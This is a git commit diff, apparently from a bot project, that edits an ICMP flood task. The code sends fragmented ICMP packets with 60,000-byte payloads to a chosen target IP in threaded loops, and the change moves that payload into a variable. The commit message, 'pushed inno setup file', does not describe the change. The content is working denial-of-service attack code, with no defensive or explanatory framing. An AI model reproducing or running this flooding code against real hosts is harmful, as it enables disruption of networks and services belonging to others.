643bb379cf719dbf6ac1bb8fa1fe08de82155f96
maruf <sherefamaruf@gmail.com>
2022-03-31 22:37:00 +0300

    pushed inno setup file

--- p-bot/lib/icmp_flood.py
+++ p-bot/lib/icmp_flood.py
@@ -9,11 +9,12 @@ class IcmpFlood(Task):
         no_of_packets = kwargs.get('no_of_packets', None)
         target_ip = kwargs.get('target_ip', None)
         packet_per = 10
+        payload = ("X"*60000)
         no_of_loops = math.ceil(no_of_packets//packet_per)+1
         for i in range(no_of_loops):
             self.progress += 100/no_of_loops
             try:
-                future  = ThreadPool.executor.submit(send(fragment(IP(dst=target_ip) / ICMP()  / ("X"*60000))*packet_per),"")
+                future  = ThreadPool.executor.submit(send(fragment(IP(dst=target_ip) / ICMP()  / payload*packet_per)),"")
             except Exception as e:
                 print(e)
             finally:                
